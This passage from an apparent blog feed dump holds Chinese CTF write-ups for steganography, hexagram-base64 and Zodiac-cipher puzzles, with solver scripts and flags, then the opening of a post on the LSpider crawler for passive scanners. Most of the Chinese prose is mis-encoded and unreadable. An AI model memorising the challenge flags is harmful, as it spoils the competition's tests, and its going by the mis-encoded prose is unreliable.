class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¨¡æ¿å›¾ï¼šè¿è¡Œç›®å½•ä¸‹çš„ model.png</span></span><br><span class="line"><span class="comment"># æ–°å»º output å’Œ blocks æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="comment"># æ‹¼å›¾åˆ‡ç‰‡æ”¾åœ¨ blocks æ–‡ä»¶å¤¹ä¸­</span></span><br><span class="line"><span class="comment"># å¸¸é‡è®¾ç½®åœ¨ 79 è¡Œ</span></span><br><span class="line"><span class="comment"># PIECES = 225 åˆ‡ç‰‡æ€»æ•°</span></span><br><span class="line"><span class="comment"># SQURE_LENGTH = 42 åˆ‡ç‰‡è¾¹é•¿</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Squeeze Model Picture into pieces</span></span><br><span class="line"><span class="comment"># Returns the path to the folder which contains pictures taged as 1.png, 2.png</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ModelPictureSqueeze</span>(<span class="params">filePath, population, lengthSqueezeSquare</span>):</span></span><br><span class="line">    modelImg = Image.<span class="built_in">open</span>(filePath)</span><br><span class="line">    width, height = modelImg.size</span><br><span class="line">    widthSqueezeCount = width // lengthSqueezeSquare <span class="comment"># squeeze count from long side</span></span><br><span class="line">    heightSqueezeCount = height // lengthSqueezeSquare</span><br><span class="line"></span><br><span class="line">    storageDir = os.path.dirname(os.path.realpath(filePath))</span><br><span class="line">    os.mkdir(storageDir + <span class="string">&quot;\\model&quot;</span>)</span><br><span class="line">    regions = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(heightSqueezeCount):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(widthSqueezeCount):</span><br><span class="line">            box = (lengthSqueezeSquare * j, lengthSqueezeSquare * i, lengthSqueezeSquare * (j + <span class="number">1</span>), lengthSqueezeSquare * (i + <span class="number">1</span>))</span><br><span class="line">            region = modelImg.crop(box)</span><br><span class="line">            regions.append(region)</span><br><span class="line">            region.save(storageDir + <span class="string">&#x27;\\model\\&#123;&#125;.&#123;&#125;&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i, j, <span class="string">&quot;.L&quot;</span> <span class="keyword">if</span> j == (widthSqueezeCount - <span class="number">1</span>) <span class="keyword">and</span> (i + <span class="number">1</span>) * (j + <span class="number">1</span>) != population <span class="keyword">else</span> <span class="string">&quot;.E&quot;</span> <span class="keyword">if</span> (i + <span class="number">1</span>) * (j + <span class="number">1</span>) == population <span class="keyword">else</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> regions, widthSqueezeCount</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fetch nine points as a sample</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NinePointSamplingAnalyze</span>(<span class="params">image</span>):</span></span><br><span class="line">    width, height = image.size</span><br><span class="line">    imgObject = image.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    pixels = imgObject.load()</span><br><span class="line">    samplings = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            samplePixel = pixels[(width - <span class="number">1</span>) <span class="keyword">if</span> j == <span class="number">2</span> <span class="keyword">else</span> (width // <span class="number">2</span>) * j, (height - <span class="number">1</span>) <span class="keyword">if</span> i == <span class="number">2</span> <span class="keyword">else</span> (height // <span class="number">2</span>) * i]</span><br><span class="line">            samplings.append(samplePixel)</span><br><span class="line">    image.close()</span><br><span class="line">    <span class="keyword">return</span> samplings</span><br><span class="line"></span><br><span class="line"><span class="comment"># Match one model sample with one puzzle sample</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingMatch</span>(<span class="params">modelSample, sample</span>):</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> sample[i] == modelSample[<span class="string">&quot;sample&quot;</span>][i]:</span><br><span class="line">            flag += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find out the best match with rotate</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestRotate</span>(<span class="params">modelSample, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        flags.append(SamplingMatch(modelSample, sample))</span><br><span class="line">        sample = SamplingRotate(sample)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)) * (-<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate a sample</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingRotate</span>(<span class="params">sample</span>):</span></span><br><span class="line">    newSamplings = []</span><br><span class="line">    index = [<span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        newSamplings.append(sample[index[i]])</span><br><span class="line">    <span class="keyword">return</span> newSamplings</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find a best match with rotate and parse to data for a puzzle sample</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestSolve</span>(<span class="params">modelSamplings, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    degrees = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(modelSamplings)):</span><br><span class="line">        flag, degree = SamplingBestRotate(modelSamplings[i], sample)</span><br><span class="line">        flags.append(flag)</span><br><span class="line">        degrees.append(degree)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)), degrees[flags.index(<span class="built_in">max</span>(flags))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># squeeze model and parse to JSON</span></span><br><span class="line">PIECES = <span class="number">225</span></span><br><span class="line">SQURE_LENGTH = <span class="number">42</span></span><br><span class="line"></span><br><span class="line">modelRegions, widthPieceCount = ModelPictureSqueeze(<span class="string">&quot;model.png&quot;</span>, PIECES, SQURE_LENGTH)</span><br><span class="line">modelSamplings = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(modelRegions)):</span><br><span class="line">    modelSamplings.append(&#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: <span class="number">2</span> <span class="keyword">if</span> (i == <span class="built_in">len</span>(modelRegions) - <span class="number">1</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">if</span> ((i + <span class="number">1</span>) % widthPieceCount) == <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;sample&quot;</span>: NinePointSamplingAnalyze(modelRegions[i])</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">jsonData = json.dumps(modelSamplings)</span><br><span class="line">print(jsonData)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># process puzzle</span></span><br><span class="line">samplings = []</span><br><span class="line">files = os.listdir(<span class="string">&quot;blocks/&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;blocks/&quot;</span> + files[i])</span><br><span class="line">    samplings.append(&#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;rotate&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;sample&quot;</span>: NinePointSamplingAnalyze(img),</span><br><span class="line">        <span class="string">&quot;oldFileName&quot;</span>: files[i],</span><br><span class="line">        <span class="string">&quot;newFileName&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">jsonData = json.dumps(samplings)</span><br><span class="line">print(jsonData)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare fileName</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(samplings)):</span><br><span class="line">    samplings[i][<span class="string">&quot;flag&quot;</span>], fileIndex, samplings[i][<span class="string">&quot;rotate&quot;</span>] = SamplingBestSolve(modelSamplings, samplings[i][<span class="string">&quot;sample&quot;</span>])</span><br><span class="line">    samplings[i][<span class="string">&quot;newFileName&quot;</span>] = <span class="string">&#x27;&#123;&#125;.&#123;&#125;&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(fileIndex // widthPieceCount, fileIndex % widthPieceCount, <span class="string">&#x27;.E&#x27;</span> <span class="keyword">if</span> fileIndex // widthPieceCount == widthPieceCount - <span class="number">1</span> <span class="keyword">and</span> fileIndex % widthPieceCount == widthPieceCount - <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;.L&#x27;</span> <span class="keyword">if</span> fileIndex % widthPieceCount == widthPieceCount - <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">jsonData = json.dumps(samplings)</span><br><span class="line">print(jsonData)</span><br><span class="line"></span><br><span class="line">heightPieceCount = PIECES // widthPieceCount</span><br><span class="line">composeImg = Image.new(<span class="string">&quot;RGB&quot;</span>, (heightPieceCount * SQURE_LENGTH, widthPieceCount * SQURE_LENGTH))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(samplings)):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;blocks/&quot;</span> + samplings[i][<span class="string">&quot;oldFileName&quot;</span>])</span><br><span class="line">    img = img.rotate(samplings[i][<span class="string">&quot;rotate&quot;</span>])</span><br><span class="line">    positionY = <span class="built_in">int</span>(samplings[i][<span class="string">&quot;newFileName&quot;</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    positionX = <span class="built_in">int</span>(samplings[i][<span class="string">&quot;newFileName&quot;</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    composeImg.paste(img, (positionX * SQURE_LENGTH, positionY * SQURE_LENGTH))</span><br><span class="line">composeImg.save(<span class="string">&quot;output/result.png&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="8-ç¢‘å¯ºå…­åå››å¦"><a href="#8-ç¢‘å¯ºå…­åå››å¦" class="headerlink" title="8.ç¢‘å¯ºå…­åå››å¦"></a>8.ç¢‘å¯ºå…­åå››å¦</h2><blockquote><p>è¿™æ˜¯ä»ä¸€å¤„å¯ºåº™é—å€ä¸­å¾—åˆ°çš„ç¢‘æ–‡æ‹“ç‰‡ï¼Œä½ èƒ½ä»ä¸­å‘ç°ä»€ä¹ˆå—ï¼Ÿ <a href="https://ctfshow.lanzous.com/iSFN4kn5jna">https://ctfshow.lanzous.com/iSFN4kn5jna</a><br>æ„Ÿè°¢@cheyenneå¸ˆå‚…ä¾›é¢˜</p><p>Hint1ã€ä¸ºä»€ä¹ˆç¢‘æ–‡ä¸Šç©ºç™½çš„åœ°æ–¹ï¼Œæ‹“ç‰‡ä¸Šå´æ˜¯é»‘é»‘ä¸€ç‰‡å‘¢ï¼Ÿ<br>Hint2ã€å¦‚æœè¯´æ¯ä¸ªæ–¹å—å¯¹åº”ä¸€ä¸ªå­—ç¬¦ï¼Œå¯æ˜¯æ›¿æ¢è¡¨åœ¨å“ªé‡Œï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3144821020.png"></p></blockquote><p>å…ˆå°†å›¾ç‰‡åè‰²ï¼š<a href="https://invert.imageonline.co/cn/"><strong>åœ¨çº¿å·¥å…·</strong></a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2073626229.png"></p><p>ç„¶åæ”¾å…¥steg lsbå‘ç°ä¸€ä¸ªPNG</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/395331647.png"></p><p>save binä¿å­˜å¹¶ä¿®æ”¹ä¸‹å¤´æ–‡ä»¶å¾—åˆ°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1365365608.png"></p><p>æ¥ç€å°†å›¾ä¸­ä¸å…­åå››å¦å›¾ç›¸æ¯”å¯¹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1010841000.png"></p><p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><blockquote><p>æ™‹ å™¬å—‘ äº• å¤ è°¦ ä¸°<br>æ¸ å¤§è¿‡ ç½ å·½ æ— å¦„ å±¯<br>ä¸­å­š è§‚ å½’å¦¹ é© å é¢<br>é© æ˜å¤· å¦ æ³° æ˜å¤·</p></blockquote><p>æ ¹æ®é¢˜ç›®æ‰€ç»™çš„å›¾å¾—åˆ°å¯¹åº”çš„æ•°å­—</p><blockquote><p>5 37 26 32 8 44<br>11 30 53 27 39 34<br>51 3 52 46 18 33<br>46 40 7 56 40</p></blockquote><p>å¯¹ç…§base64ç¼–ç è¡¨å¾—åˆ°flagï¼šflag{Le1bnizD0uShuoH4o}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1594111265.png"></p><h2 id="9-AA86"><a href="#9-AA86" class="headerlink" title="9.AA86"></a>9.AA86</h2><blockquote><p>åœ¨ä¸€å°æ—§ç”µè„‘ä¸Šï¼ˆå¤§çº¦åœ¨16ä½æ“ä½œç³»ç»Ÿè¿˜èƒ½è·‘çš„å¹´ä»£ï¼‰å‘ç°äº†è¿™ä¸ªæ–‡ä»¶ï¼ŒæŒ–æ˜å®ƒçš„ç§˜å¯†<br>æ„Ÿè°¢@ThTsOdå¸ˆå‚…ä¾›é¢˜</p><p>Hint:è¯·ä»”ç»†é˜…è¯»é¢˜ç›®æè¿°(5æ¯›ä¸€æ¡ï¼Œå»æ‰æ‹¬å·)</p></blockquote><p>ç ”ç©¶ingï¼ˆ0%</p><hr><h1 id="â€œæ˜¥ç§‹æ¯â€æ–°å¹´æ¬¢ä¹èµ›"><a href="#â€œæ˜¥ç§‹æ¯â€æ–°å¹´æ¬¢ä¹èµ›" class="headerlink" title="â€œæ˜¥ç§‹æ¯â€æ–°å¹´æ¬¢ä¹èµ›"></a>â€œæ˜¥ç§‹æ¯â€æ–°å¹´æ¬¢ä¹èµ›</h1><h2 id="1-ç­¾åˆ°"><a href="#1-ç­¾åˆ°" class="headerlink" title="1.ç­¾åˆ°"></a>1.ç­¾åˆ°</h2><blockquote><p>ä¸‡ç‰©çš†æœ‰â€FUNâ€ï¼Œç”µè„‘æ‰«â€FUNâ€æ´»åŠ¨ï¼Œæä¾›å¤§å†™çš„â€FUNâ€å­—æ ·ï¼Œå³å¯è·å–flag~</p><p><a href="https://pan.baidu.com/s/150djKEGXDal5YxvYI8Pjnw"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š2alsï¼‰</p></blockquote><p>å¯¹ç€æ‘„åƒå¤´æ‰«æå¸¦æœ‰â€œFUNâ€çš„å­—æ ·å³å¯è·å¾—flag</p><h2 id="2-åäºŒå®«çš„æŒ‘è¡…"><a href="#2-åäºŒå®«çš„æŒ‘è¡…" class="headerlink" title="2.åäºŒå®«çš„æŒ‘è¡…"></a>2.åäºŒå®«çš„æŒ‘è¡…</h2><blockquote><p>ä½†æ„¿ä½ èƒ½è§£å‡ºå¯†æ–‡ï¼Œä¸ç„¶æˆ‘å°±ä¼šç»§ç»­çŠ¯ç½ª:)<br>æœ¬é¢˜è·å–flagæäº¤å‰è¯·åŠ ä¸Šflag{}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2712412650.png"></p></blockquote><p>æ ¹æ®é¢˜ç›®æ‰€æè¿°çš„å¯çŸ¥æ˜¯é»„é“åäºŒå®«æ¡ˆä»¶ä¸­çš„åŠ å¯†æ–¹å¼<br>å…ˆæŠŠå›¾ä¸­çš„å¯†æ–‡åˆ—å‡ºæ¥</p><blockquote><p>^#@$@#()/&gt;@?==%1(<br>!)&gt;(<em>+3&lt;#86@-7$^.<br>4&amp;)8%#&amp;6!=%1#$-$<br>+5&amp;?#!.03!%=@=101<br>0?(*~#??.+)%&amp;.7^8<br>=1%*^=$5$7@@8&gt;&amp;<em>9<br>9@0185(+7)&lt;%3#@^4<br>&amp;@@&lt;.)#3</em>#%%&lt;&lt;</em>++<br>@.?=~**+!==65^@&amp;</p></blockquote><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s1=<span class="string">r&#x27;^#@$@#()/&gt;@?==%1(&#x27;</span>*<span class="number">9</span></span><br><span class="line">s2=<span class="string">r&#x27;!)&gt;(*+3&lt;#86@-7$^.&#x27;</span>*<span class="number">9</span></span><br><span class="line">s3=<span class="string">r&#x27;4&amp;)8%#5&amp;6!=%1#$-$&#x27;</span>*<span class="number">9</span></span><br><span class="line">s4=<span class="string">r&#x27;+5&amp;?#!.03!%=@=101&#x27;</span>*<span class="number">9</span></span><br><span class="line">s5=<span class="string">r&#x27;0?(*~#??.+)%&amp;.7^8&#x27;</span>*<span class="number">9</span></span><br><span class="line">s6=<span class="string">r&#x27;=1%*^=$5$7@@8&gt;&amp;*9&#x27;</span>*<span class="number">9</span></span><br><span class="line">s7=<span class="string">r&#x27;9@0185(+7)&lt;%3#@^4&#x27;</span>*<span class="number">9</span></span><br><span class="line">s8=<span class="string">r&#x27;&amp;@@&lt;.)#3*#%%&lt;&lt;*++&#x27;</span>*<span class="number">9</span></span><br><span class="line">s9=<span class="string">r&#x27;.@.?=~**+!==65^@&amp;&#x27;</span>*<span class="number">9</span></span><br><span class="line"></span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    tmp += s1[i]+s2[i+<span class="number">2</span>]+s3[i+<span class="number">4</span>]+s4[i+<span class="number">6</span>]+s5[i+<span class="number">8</span>]+s6[i+<span class="number">10</span>]+s7[i+<span class="number">12</span>]+s8[i+<span class="number">14</span>]+s9[i+<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut</span>(<span class="params">obj, sec</span>):</span></span><br><span class="line">    str_list = [obj[i:i+sec] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(obj),sec)]</span><br><span class="line">    print(str_list)</span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line">l1=cut(tmp,<span class="number">17</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l1:</span><br><span class="line">    <span class="built_in">print</span> (i)</span><br></pre></td></tr></table></figure><p>è·‘ä¸€ä¸‹å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3595330600.png"></p><p>æœ€åä½¿ç”¨å·¥å…·AZdecryptè§£å¯†å¾—åˆ°flagï¼šflag{WUUHUUTAKEOFF}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2676303170.png"></p><h2 id="3-puzzle"><a href="#3-puzzle" class="headerlink" title="3.puzzle"></a>3.puzzle</h2><blockquote><p>æ‹¼å›¾çš„å¥½å¤„ï¼š<br>1ã€åŠ¨æ‰‹åˆåŠ¨è„‘ï¼Œå¼€å‘æ™ºåŠ›ï¼Œå¢åŠ å‡ ä½•ç©ºé—´æ„Ÿ<br>2ã€ä½ å¯ä»¥åœ¨æ‹¼å¥½åçš„ä½œå“ä¸Šå‘æŒ¥æƒ³è±¡ï¼Œç»˜ä¸Šä¸ä¼—ä¸åŒçš„è‰²å½©ï¼Œè¿™æ ·ï¼Œä½ çš„ä½œå“å°±æˆäº†ç‹¬ä¸€æ— äºŒçš„è‰ºæœ¯å“äº†ã€‚<br>3ã€ä¸å®¶äººæˆ–æœ‹å‹ä¸€èµ·æ‹¼è£…ï¼Œå¢åŠ äº†äº¤æµï¼Œå¢è¿›æ„Ÿæƒ…ä¸äº²æƒ…<br>è¿™ä¹ˆå¤šçš„ç›Šå¤„ï¼Œæ‰€ä»¥èµ¶ç´§æ¥ç©å§~</p><p><a href="https://pan.baidu.com/s/1OD4bV7JzNiZQpbvrngE0Aw"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šl1hsï¼‰</p></blockquote><p>æ‰‹å·¥æ‹¼å›¾ï¼Œå°†æœ‰å­—çš„ç¢ç‰‡å•ç‹¬æå–å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3417490372.png"></p><p>åˆ©ç”¨PSè¿›è¡Œæ‹¼å›¾å¾—åˆ°flagï¼šflag{w9w45my6x8kk4e8gp9nqm6j2c154wad49}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/457811397.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤§å‰å¤§åˆ©æ¯ </tag>
            
            <tag> æ˜¥ç§‹æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ºè¢«åŠ¨æ‰«æå™¨é‡èº«æ‰“é€ ä¸€æ¬¾çˆ¬è™« - LSpider</title>
      <link href="2021/01/29/LSpider/"/>
      <url>2021/01/29/LSpider/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä½œè€…:LoRexxarâ€™@çŸ¥é“åˆ›å®‡404å®éªŒå®¤<br>æ—¥æœŸï¼š2021å¹´1æœˆ28æ—¥<br>githubå¼€æºåœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;LSpider</span><br></pre></td></tr></table></figure><h1 id="ä»€ä¹ˆæ˜¯LSpider"><a href="#ä»€ä¹ˆæ˜¯LSpider" class="headerlink" title="ä»€ä¹ˆæ˜¯LSpider?"></a>ä»€ä¹ˆæ˜¯LSpider?</h1><p>ä¸€æ¬¾ä¸ºè¢«åŠ¨æ‰«æå™¨è€Œç”Ÿçš„å‰ç«¯çˆ¬è™«~</p><p>ç”±Chrome Headlessã€LSpiderä¸»æ§ã€Mysqlæ•°æ®åº“ã€RabbitMQã€è¢«åŠ¨æ‰«æå™¨5éƒ¨åˆ†ç»„åˆè€Œæˆã€‚<br>(1) å»ºç«‹åœ¨Chrome HeadlessåŸºç¡€ä¸Šï¼Œå°†æ¨¡æ‹Ÿç‚¹å‡»å’Œè§¦å‘äº‹ä»¶ä½œä¸ºæ ¸å¿ƒåŸç†ï¼Œé€šè¿‡è®¾ç½®ä»£ç†å°†æµé‡å¯¼å‡ºåˆ°è¢«åŠ¨æ‰«æå™¨ã€‚<br>(2) é€šè¿‡å†…ç½®ä»»åŠ¡+å­åŸŸåapiæ¥è¿›è¡Œå‘æ•£å¼çš„çˆ¬å–ï¼Œç›®çš„ç»å¯èƒ½çš„è§¦å‘å¯¹åº”ç›®æ ‡åŸŸçš„æµé‡ã€‚<br>(3) é€šè¿‡RabbitMQæ¥è¿›è¡Œä»»åŠ¡ç®¡ç†ï¼Œæ”¯æŒå¤§é‡çº¿ç¨‹åŒæ—¶ä»»åŠ¡ã€‚<br>(4) æ™ºèƒ½å¡«å……è¡¨å•ï¼Œæäº¤è¡¨å•ç­‰ã€‚<br>(5) é€šè¿‡ä¸€äº›æ–¹å¼æ™ºèƒ½åˆ¤æ–­ç™»å½•æ¡†ï¼Œå¹¶åé¦ˆç»™ä½¿ç”¨è€…ï¼Œä½¿ç”¨è€…å¯ä»¥é€šè¿‡æ·»åŠ cookieçš„æ–¹å¼æ¥å®Œæˆç™»å½•ã€‚<br>(6) å®šåˆ¶äº†ç›¸åº”çš„Webhookæ¥å£ï¼Œä»¥ä¾›Webhookç»Ÿè®¡å‘é€åˆ°å¾®ä¿¡ã€‚<br>(7) å†…ç½®äº†Hackeroneã€bugcrowdçˆ¬è™«ï¼Œæä¾›è´¦å·çš„æƒ…å†µä¸‹å¯ä»¥ä¸€é”®è·å–æŸä¸ªç›®æ ‡çš„æ‰€æœ‰èŒƒå›´ã€‚</p><h2 id="ä¸ºä»€ä¹ˆé€‰æ‹©LSpider"><a href="#ä¸ºä»€ä¹ˆé€‰æ‹©LSpider" class="headerlink" title="ä¸ºä»€ä¹ˆé€‰æ‹©LSpider?"></a>ä¸ºä»€ä¹ˆé€‰æ‹©LSpider?</h2><p>LSpideræ˜¯ä¸“é—¨ä¸ºè¢«åŠ¨æ‰«æå™¨å®šåˆ¶çš„çˆ¬è™«ï¼Œè®¸å¤šåŠŸèƒ½éƒ½æ˜¯ä¸ºè¢«åŠ¨æ‰«æå™¨è€ŒæœåŠ¡çš„ã€‚<br>å»ºç«‹åœ¨RabbitMQçš„ä»»åŠ¡ç®¡ç†ç³»ç»Ÿç›¸å½“ç¨³å®šï¼Œå¯ä»¥é•¿æœŸåœ¨æ— äººç›‘ç®¡çš„æƒ…å†µä¸‹è¿›è¡Œå‘æ•£å¼çš„çˆ¬å–ã€‚</p><h2 